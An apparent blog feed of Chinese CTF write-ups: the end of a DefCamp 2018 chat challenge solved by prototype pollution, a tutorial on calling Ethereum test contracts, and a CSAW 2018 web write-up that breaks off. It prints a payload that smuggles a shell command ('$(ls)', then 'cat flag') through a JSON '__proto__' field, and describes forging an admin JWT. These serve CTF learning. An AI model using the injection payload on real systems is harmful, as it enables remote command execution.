class="hljs-attr">b</span>: <span class="hljs-number">2</span>&#125;</span><br><span class="line">&gt;parsedObj.__proto__</span><br><span class="line">&lt;&#123;<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>&#125;</span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/dctf/2.png"><br></div><br>&emsp;&emsp;可以看出JSON.parse的时候把<strong>proto</strong>当成了属性处理，并没有过滤这个属性。所以我们可以构造如下的poc:<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inputUser = <span class="hljs-string">`&#123;"name": "admin", "__proto__": &#123;"country": "'$(ls)'"&#125;&#125;`</span>;</span><br><span class="line">socket.emit(<span class="hljs-string">'register'</span>, inputUser);</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;这里我们注意在<code>$(ls)</code>两端要加上<code>&#39;</code>，使之得到命令（字符串）拼接的效果。<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cowsay 'User admin living in '$(ls)' joined channel'</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;当我们发送过去后即可得到ls的结果：<br><div align="center"><br>    <img src="/images/posts/dctf/3.png"><br></div><p>&emsp;&emsp;这里注意我们需要直接使用字符串，而不是构造好{}，再用JSON.stringify()得到字符串，因为在stringify的时候会忽略<code>__proto__</code>。如：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> inputUser = &#123;</span><br><span class="line">  name: process.argv[<span class="hljs-number">2</span>],</span><br><span class="line">  __proto__: <span class="hljs-string">'&#123;"country": "\'$(ls)\'"&#125;'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">"JSON.stringify(inputUser) = "</span> + <span class="hljs-built_in">JSON</span>.stringify(inputUser));</span><br><span class="line">socket.emit(<span class="hljs-string">'register'</span>, <span class="hljs-built_in">JSON</span>.stringify(inputUser));</span><br><span class="line">socket.emit(<span class="hljs-string">'message'</span>, <span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">"hello"</span> &#125;));</span><br><span class="line">socket.emit(<span class="hljs-string">'join'</span>, process.argv[<span class="hljs-number">3</span>]);<span class="hljs-comment">//ps: you should keep your channels private</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;结果如下：</p><div align="center"><br>    <img src="/images/posts/dctf/4.png"><br></div><br>&emsp;&emsp;所以我们直接使用cat falg。<br><div align="center"><br>    <img src="/images/posts/dctf/5.png"><br></div><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>&emsp;&emsp;<a href="https://rawsec.ml/en/DefCamp-2018-Quals-write-ups/#211-chat-web" target="_blank">https://rawsec.ml/en/DefCamp-2018-Quals-write-ups/#211-chat-web</a></p><p>&emsp;&emsp;<a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">https://xz.aliyun.com/t/2735</a></p><p>&emsp;&emsp;<a href="https://github.com/sunyongjian/blog/issues/23" target="_blank">https://github.com/sunyongjian/blog/issues/23</a></p><p>&emsp;&emsp;<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p><p>&emsp;&emsp;<a href="https://medium.com/intrinsic/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96" target="_blank">https://medium.com/intrinsic/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96</a><br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;这是Defcamp CTF 2018中的一道web题(chat)题解，在deep &lt;code&gt;clone&lt;/code&gt;的时候使用了&lt;code&gt;Prototype pollution attack&lt;/code&gt;，原型污染攻击的方法解题。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【BlockChain】 调用智能合约的方法</title>
    <link href="http://yoursite.com/2018/09/cte-writeup/"/>
    <id>http://yoursite.com/2018/09/cte-writeup/</id>
    <published>2018-09-28T08:47:56.000Z</published>
    <updated>2018-11-23T12:43:18.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;本文主要讲调用已部署的智能合约的几种方法，以<a href="https://capturetheether.com" target="_blank">Capture The Ether</a>网站为例，调用测试链为Ropsten。<br><a id="more"></a></p><h2 id="使用remix-ide"><a href="#使用remix-ide" class="headerlink" title="使用remix-ide"></a>使用remix-ide</h2><p>&emsp;&emsp;<a href="https://github.com/ethereum/remix-ide" target="_blank">remix-ide</a>是<code>Browser-Only Solidity IDE and Runtime Environment</code>。能够帮助我们调试合约代码。在本地搭建好后可以直接使用浏览器打开访问。</p><p>&emsp;&emsp;这里以CTE里的一道题为<a href="https://capturetheether.com/challenges/warmup/call-me/" target="_blank">例子</a>。</p><p><div align="center"><br>    <img src="/images/posts/cte/1.png"><br></div><br>&emsp;&emsp;代码如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">callme</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;</span><br><span class="line">        isComplete = <span class="hljs-literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;目的是调用ropsten里的callme。</p><p>&emsp;&emsp;点击开始后会得到一个合约地址：</p><p><div align="center"><br>    <img src="/images/posts/cte/2.png"><br></div><br>&emsp;&emsp;我们把代码放到remix-ide里，并进行编译</p><p><div align="center"><br>    <img src="/images/posts/cte/3.png"><br></div><br>&emsp;&emsp;在<code>Run</code>标签栏里，填好所需的信息，如环境，合约地址，最后能看到在ropsten里部署好的合约：</p><p><div align="center"><br>    <img src="/images/posts/cte/4.png"><br></div><br>&emsp;&emsp;点击<code>callme</code>，在console里会输出log信息，并给出是否成功。</p><p><div align="center"><br>    <img src="/images/posts/cte/5.png"><br></div><br>&emsp;&emsp;此时，回到题目，点击检查。即可通过这关。</p><p>&emsp;&emsp;使用remix-ide只能满足简单的交互要求，如果交互频繁，则可以选择更为灵活的代码实现。</p><h2 id="web3py"><a href="#web3py" class="headerlink" title="web3py"></a>web3py</h2><p>&emsp;&emsp;web3py是web3.js在python上的实现，可以使用pip安装：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install web3</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;一个使用web3py简单交互的代码如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="hljs-keyword">from</span> web3.contract <span class="hljs-keyword">import</span> ConciseContract</span><br><span class="line"><span class="hljs-keyword">from</span> web3.eth <span class="hljs-keyword">import</span> Eth</span><br><span class="line"></span><br><span class="line">false = <span class="hljs-keyword">False</span></span><br><span class="line">true = <span class="hljs-keyword">True</span></span><br><span class="line">config = &#123;</span><br><span class="line">    <span class="hljs-string">"abi"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: false,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"callme"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: false,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">"constant"</span>: true,</span><br><span class="line">        <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"isComplete"</span>,</span><br><span class="line">        <span class="hljs-string">"outputs"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">                <span class="hljs-string">"type"</span>: <span class="hljs-string">"bool"</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="hljs-string">"payable"</span>: false,</span><br><span class="line">        <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">    &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="hljs-string">"address"</span>: <span class="hljs-string">"0x1933fEa88E2295e7b7A5523A86CE69742794DaA8"</span> <span class="hljs-comment"># 合约地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INFURA_API_KEY=<span class="hljs-string">"your_key"</span></span><br><span class="line">ROPSTEN_URL = <span class="hljs-string">"https://ropsten.infura.io/%s"</span> %INFURA_API_KEY</span><br><span class="line"></span><br><span class="line">web3 = Web3(HTTPProvider(ROPSTEN_URL))</span><br><span class="line"></span><br><span class="line">contract_instance = web3.eth.contract(address=config[<span class="hljs-string">'address'</span>], abi=config[<span class="hljs-string">'abi'</span>])</span><br><span class="line"></span><br><span class="line">MY_ADDR = <span class="hljs-string">"0x901B1bDE..."</span>   <span class="hljs-comment"># 你的地址</span></span><br><span class="line">PRIV_KEY = <span class="hljs-string">"0x1dc7..."</span>  <span class="hljs-comment"># 你的私钥</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SendTxn</span><span class="hljs-params">(txn)</span>:</span></span><br><span class="line">    signed_txn = web3.eth.account.signTransaction(txn, private_key=PRIV_KEY)</span><br><span class="line">    res = web3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()</span><br><span class="line">    txn_receipt = web3.eth.waitForTransactionReceipt(res)</span><br><span class="line">    <span class="hljs-comment">#</span></span><br><span class="line">    print(res)</span><br><span class="line">    <span class="hljs-keyword">return</span> txn_receipt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">txn = contract_instance.functions.callme().buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-string">'chainId'</span>: <span class="hljs-number">3</span>,  <span class="hljs-comment">#ropsten, 1 for main</span></span><br><span class="line">        <span class="hljs-string">'nonce'</span>: web3.eth.getTransactionCount(MY_ADDR),</span><br><span class="line">        <span class="hljs-string">'gas'</span>: <span class="hljs-number">7600000</span>,</span><br><span class="line">        <span class="hljs-string">'value'</span>:Web3.toWei(<span class="hljs-number">0</span>,<span class="hljs-string">'ether'</span>),</span><br><span class="line">        <span class="hljs-string">'gasPrice'</span>: web3.eth.gasPrice,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(SendTxn(txn))</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;要实例化一个合约，需要<code>abi</code>和<code>合约地址</code>两个参数，abi可以在remix-ide里获取到。</p><p><div align="center"><br>    <img src="/images/posts/cte/6.png"><br></div><br>&emsp;&emsp;另外，使用web3的过程中我们需要连接到以太坊节点，如<code>HTTPProvider</code>。如果自己本地没有搭建好节点，那么可以使用第三方提供的节点，如<a href="https://infura.io/" target="_blank">infura</a>。注册好后可以得到一个app key，使用该key就能连入infura提供的节点。</p><p>&emsp;&emsp;实例化contract以后我们可以使用<code>contract_instance.functions.callme()</code>的方法调用合约内的函数。因为我们需要实际改变ropsten链的值，所以我们需要创建一个交易，完成对ropsten的通信，所以还需调用<code>buildTransaction</code>方法。最后把签完名的交易块发送到ropsten链上。</p><h2 id="web3-js"><a href="#web3-js" class="headerlink" title="web3.js"></a>web3.js</h2><p>&emsp;&emsp;web3.js是官方提供的库。其调用代码如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"web3"</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> Tx = <span class="hljs-built_in">require</span>(<span class="hljs-string">'ethereumjs-tx'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 合约地址</span></span><br><span class="line"><span class="hljs-keyword">let</span> contractAddress = <span class="hljs-string">"0x799Caa8d82d70296f1eA4992B76553ABD72da9B1"</span>;</span><br><span class="line"><span class="hljs-comment">// 创建web3对象</span></span><br><span class="line"><span class="hljs-keyword">let</span> web3 = <span class="hljs-keyword">new</span> Web3();</span><br><span class="line"><span class="hljs-comment">// 连接到 ropsten 测试节点</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> INFURA_API_KEY=<span class="hljs-string">"************"</span></span><br><span class="line"><span class="hljs-keyword">let</span> ROPSTEN_URL = <span class="hljs-string">"https://ropsten.infura.io/"</span> + INFURA_API_KEY</span><br><span class="line">web3.setProvider(<span class="hljs-keyword">new</span> Web3.providers.HttpProvider(ROPSTEN_URL))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> fromAddress = <span class="hljs-string">"0x901B1bDE..."</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> count = web3.eth.getTransactionCount(fromAddress);</span><br><span class="line"><span class="hljs-keyword">let</span> gasPrice = web3.eth.gasPrice;</span><br><span class="line"><span class="hljs-keyword">let</span> gasLimit = <span class="hljs-number">90000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> rawTransaction = &#123;</span><br><span class="line">    <span class="hljs-string">"from"</span>: fromAddress,</span><br><span class="line">    <span class="hljs-string">"nonce"</span>: web3.toHex(count),</span><br><span class="line">    <span class="hljs-string">"gasPrice"</span>: web3.toHex(gasPrice),</span><br><span class="line">    <span class="hljs-string">"gasLimit"</span>: web3.toHex(gasLimit),</span><br><span class="line">    <span class="hljs-string">"to"</span>: contractAddress,</span><br><span class="line">    <span class="hljs-string">"value"</span>: <span class="hljs-string">"0x0"</span>,</span><br><span class="line">    <span class="hljs-string">"data"</span>: <span class="hljs-string">"0xa3c8e393"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 读取私钥，这里不包含‘0x’两个字符</span></span><br><span class="line"><span class="hljs-keyword">let</span> privKey = <span class="hljs-keyword">new</span> Buffer.from(<span class="hljs-string">'1dc72....'</span>, <span class="hljs-string">'hex'</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> tx = <span class="hljs-keyword">new</span> Tx(rawTransaction);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 用私钥签名交易信息</span></span><br><span class="line">tx.sign(privKey);</span><br><span class="line"><span class="hljs-keyword">let</span> serializedTx = tx.serialize();</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 发送交易</span></span><br><span class="line">web3.eth.sendRawTransaction(<span class="hljs-string">'0x'</span> + serializedTx.toString(<span class="hljs-string">'hex'</span>), </span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, hash</span>) </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> (!err)</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(hash);</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">            <span class="hljs-built_in">console</span>.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;如上，这里我们要重点关注<code>rawTransaction</code>里的<code>data</code>段。</p><p>&emsp;&emsp;它是所调函数的函数声明做keccak256（即sha3）的哈希，并取前4个字节组成。如果需要传递参数，则把需要传递的参数转换成16进制，并在前面填满<code>32字节</code>（64位）。然后跟函数签名拼接而成。</p><p>&emsp;&emsp;相关的说明我们可以参考：</p><p>&emsp;&emsp;<a href="https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI#examples" target="_blank" rel="noopener">https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI#examples</a></p><p>&emsp;&emsp;<a href="https://github.com/linjie-1/guigulive-operation/wiki/Ethereum%E7%9A%84%E5%90%88%E7%BA%A6ABI%E6%8B%93%E5%B1%95#abi%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8" target="_blank" rel="noopener">https://github.com/linjie-1/guigulive-operation/wiki/Ethereum%E7%9A%84%E5%90%88%E7%BA%A6ABI%E6%8B%93%E5%B1%95#abi%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8</a><br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;本文主要讲调用已部署的智能合约的几种方法，以&lt;a href=&quot;https://capturetheether.com&quot; target=&quot;_blank&quot;&gt;Capture The Ether&lt;/a&gt;网站为例，调用测试链为Ropsten。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="BlockChain" scheme="http://yoursite.com/tags/BlockChain/"/>
    
      <category term="web3" scheme="http://yoursite.com/tags/web3/"/>
    
  </entry>
  
  <entry>
    <title>CSAW 2018 复现writeup</title>
    <link href="http://yoursite.com/2018/09/csaw-writeup2/"/>
    <id>http://yoursite.com/2018/09/csaw-writeup2/</id>
    <published>2018-09-17T08:47:56.000Z</published>
    <updated>2018-11-23T12:42:42.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title="_"></a>_</h1><p>&emsp;&emsp;补补web<br><a id="more"></a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="sso"><a href="#sso" class="headerlink" title="sso"></a>sso</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Don&apos;t you love undocumented APIs</span><br><span class="line"></span><br><span class="line">Be the admin you were always meant to be</span><br><span class="line"></span><br><span class="line">http://web.chal.csaw.io:9000</span><br><span class="line"></span><br><span class="line">Update chal description at: 4:38 to include solve details</span><br><span class="line"></span><br><span class="line">Aesthetic update for chal at Sun 7:25 AM</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;打开源代码如下：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/protected"</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;!--</span></span><br><span class="line"><span class="hljs-comment">Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess</span></span><br><span class="line"><span class="hljs-comment">POST /oauth2/token</span></span><br><span class="line"><span class="hljs-comment">POST /oauth2/authorize form-data <span class="hljs-doctag">TODO:</span> make a form for this route</span></span><br><span class="line"><span class="hljs-comment">--!&gt;</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;关于OAUTH2.0的授权的详细模式可以参考<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank">这篇文章</a>的<code>六、授权码模式</code>。</p><p>&emsp;&emsp;授权模式大致流程如下：</p><ol><li>获取Authorization Code，通常访问/authorize</li></ol><p>请求的参数：</p><ul><li>response_type：表示授权类型，必选项，此处的值固定为”code”</li><li>client_id：表示客户端的ID，必选项</li><li>redirect_uri：表示重定向URI，可选项</li><li>scope：表示申请的权限范围，可选项</li><li>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。</li></ul><ol start="2"><li>获取Access Token，通常访问/token</li></ol><p>请求的参数：</p><ul><li>grant_type：表示使用的授权模式，必选项，此处的值固定为”authorization_code”。</li><li>code：表示上一步获得的授权码，必选项。</li><li>redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。</li><li>client_id：表示客户端ID，必选项。</li></ul><ol start="3"><li>访问限制资源，比如这里的/protected</li></ol><p>&emsp;&emsp;所以第一步，获取Authorization Code。</p><div align="center"><br>    <img src="/images/posts/csaw/10.png"><br></div><br>&emsp;&emsp;然后在我们的服务器上能收到：<br><div align="center"><br>    <img src="/images/posts/csaw/11.png"><br></div><br>&emsp;&emsp;拿到code：<br><br>&emsp;&emsp;再去拿到token。<br><div align="center"><br>    <img src="/images/posts/csaw/12.png"><br></div><br>&emsp;&emsp;得到token：<br><br>&emsp;&emsp;将这个token拿到<a href="https://jwt.io/" target="_blank">jwt.io/</a>解密。<br><div align="center"><br>    <img src="/images/posts/csaw/13.png"><br></div><br>&emsp;&emsp;这里的<code>secret</code>就是加密秘钥，所以我们可以将type改为admin。<br><div align="center"><br>    <img src="/images/posts/csaw/14.png"><br></div><br>&emsp;&emsp;我们拿着这个token去访问<code>/protected</code>。<br><div align="center"><br>    <img src="/images/posts/csaw/15.png"><br></div><br>&emsp;&emsp;得到flag：flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}。<br><br>#### 参考链接<br>&emsp;&emsp;<a href="https://www.aperikube.fr/docs/csawquals_2018/sso/" target="_blank" rel="noopener">https://www.aperikube.fr/docs/csawquals_2018/sso/</a><br><br>&emsp;&emsp;<a href="https://github.com/TryCTFAgain/CTF-Writeups/blob/master/2018/CSAW%20CTF&#39;18/web.md#sso" target="_blank" rel="noopener">https://github.com/TryCTFAgain/CTF-Writeups/blob/master/2018/CSAW%20CTF&#39;18/web.md#sso</a><br><br>### Hacker Movie Club<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hacker Movie Club</span><br><span class="line">Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.</span><br><span class="line"></span><br><span class="line">Author: itszn (ret2 systems)</span><br><span class="line"></span><br><span class="line">http://app.hm.vulnerable.services/</span><br></pre></td></tr></table></figure><br><br><div align="center"><br>    <img src="/images/posts/csaw/16.png"><br></div><br>&emsp;&emsp;打开主页如下：<br><div align="center"><br>    <img src="/images/posts/csaw/17.png"><br></div><br>&emsp;&emsp;源码：（去掉style）<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">data-src</span>=<span class="hljs-string">"mustache.min.js"</span> <span class="hljs-attr">data-cdn</span>=<span class="hljs-string">"4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services"</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">data-src</span>=<span class="hljs-string">"app.js"</span> <span class="hljs-attr">data-cdn</span>=<span class="hljs-string">"4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services"</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span>Loading..<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">window</span>.loaded_recapcha = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;</span></span><br><span 